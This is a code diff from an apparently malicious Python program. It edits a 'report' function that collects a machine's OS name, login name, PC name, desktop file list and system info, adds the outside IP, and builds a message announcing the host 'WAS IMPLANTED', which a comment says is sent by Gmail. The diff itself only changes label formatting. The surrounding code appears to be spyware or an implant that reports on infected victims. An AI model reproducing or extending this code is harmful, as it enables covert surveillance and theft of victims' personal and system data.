@@ -70,10 +70,10 @@ def get_outside_ip(arg, arg2):
  
 # Send on g-mail information about PC
 def report(ip_adress, arg, arg2):
-    array = ['\n OS_NAME => ' + str(os.environ['OS']),                          
-             '\n LOGIN => ' + str(os.environ['USERNAME']),                      
-             '\n PC_NAME => ' + str(os.environ['USERDOMAIN']),                  
-             '\n DESKTOP_FILES => ' + arg,                                         
+    array = ['\n OS_NAME    => ' + str(os.environ['OS']),                          
+             '\n LOGIN      => ' + str(os.environ['USERNAME']),                      
+             '\n PC_NAME    => ' + str(os.environ['USERDOMAIN']),                  
+             '\n DESK_FILES => ' + arg,                                         
              '\n SYS_INFO => ' + arg2]
     pc_name = socket.gethostname()
     report_text = str(ip_adress) + ' WAS IMPLANTED !!! \n\n' + '\n'.join(array)
